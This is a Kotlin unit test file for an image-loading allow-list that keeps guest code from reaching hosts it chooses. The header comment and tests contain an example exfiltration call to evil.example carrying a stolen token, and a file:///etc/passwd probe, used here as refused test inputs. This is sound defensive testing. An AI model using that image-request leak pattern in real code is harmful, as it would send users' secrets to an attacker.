/*
 * Project Dogwood -- images were the other way out, and nobody was watching it.
 *
 * `DogwoodNetwork` default-denies, caps bodies and re-checks redirects, all because the payload is
 * downloaded and replaceable over the air. None of it applied to images: `AsyncImage(url)` handed a
 * guest-supplied string to Coil and Coil fetched it. A guest wanting to exfiltrate never needed
 * `fetch` at all --
 *
 *     AsyncImage("https://evil.example/collect?token=" + stolen)
 *
 * -- leaks on the *request*, and does not care that no image comes back.
 *
 * These exercise the decision rather than Coil's object graph. Faking `Interceptor.Chain`,
 * `ImageRequest` and `Image` convincingly would buy coverage of Coil's types rather than of this
 * rule, and the rule is the part that decides whether a guest reaches a host it chose. What the
 * adapter around it does -- refuse without calling `proceed()` -- is four lines and visible.
 */
package dev.dogwood.host

import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertNull
import kotlin.test.assertTrue

class ImagePolicyTest {

  private val cdnOnly = allowImageHosts("cdn.example")

  @Test
  fun anAllowedImageHostProceeds() {
    // The control. Without it every refusal below would pass against a rule that refused
    // everything -- a very secure way to render no pictures at all.
    assertNull(imageVerdict("https://cdn.example/a.jpg", cdnOnly))
  }

  @Test
  fun aDisallowedImageHostIsRefusedByUrl() {
    val leak = "https://evil.example/collect?token=secret"
    assertEquals(leak, imageVerdict(leak, cdnOnly), "the exfiltration URL must be refused")
  }

  @Test
  fun theDefaultRefusesEverything() {
    // Matching DogwoodNetwork: a host that configures nothing gets default-deny rather than an
    // accidental hole, which is the only safe default for a channel the guest controls.
    assertEquals("https://anywhere.example/a.jpg", imageVerdict("https://anywhere.example/a.jpg", allowImageHosts()))
  }

  @Test
  fun cleartextIsPerHostForImagesToo() {
    val rule = allowImageHosts("cdn.example", "localhost", allowCleartextHosts = setOf("localhost"))
    assertTrue(rule("http://localhost:8080/a.jpg"), "the opt-in names this host")
    assertTrue(!rule("http://cdn.example/a.jpg"), "named for https does not mean named for http")
    assertTrue(rule("https://cdn.example/a.jpg"))
    assertTrue(!rule("https://evil.example/a.jpg"))
  }

  @Test
  fun hostSuppliedModelsAreNotSubjectToTheGuestPolicy() {
    // The policy governs what the GUEST can reach. A drawable the host chose never crossed the
    // boundary, and refusing it would break host chrome for no security benefit.
    assertNull(imageVerdict(null, allowImageHosts()))
    assertNull(imageVerdict(12345, allowImageHosts()), "a resource identifier")
    assertNull(imageVerdict("res:///placeholder", allowImageHosts()))
    assertNull(imageVerdict(ByteArray(4), allowImageHosts()))
  }

  @Test
  fun theSchemeIsConstrainedTheSameWayTheDataPolicyIs() {
    // The lesson from the iOS network review, applied here before it could bite: a rule that only
    // waives "must be https" lets file: and data: through on any platform whose loader serves them.
    val rule = allowImageHosts("localhost", allowCleartextHosts = setOf("localhost"))
    assertTrue(!rule("file://localhost/etc/passwd"))
    assertTrue(!rule("data://localhost/x"))
    assertTrue(!rule("ftp://localhost/x"))
  }

  @Test
  fun aPortDoesNotSmuggleADifferentHost() {
    assertTrue(allowImageHosts("cdn.example")("https://cdn.example:8443/a.jpg"))
    assertTrue(!allowImageHosts("cdn.example")("https://evil.example/cdn.example/a.jpg"))
  }
}
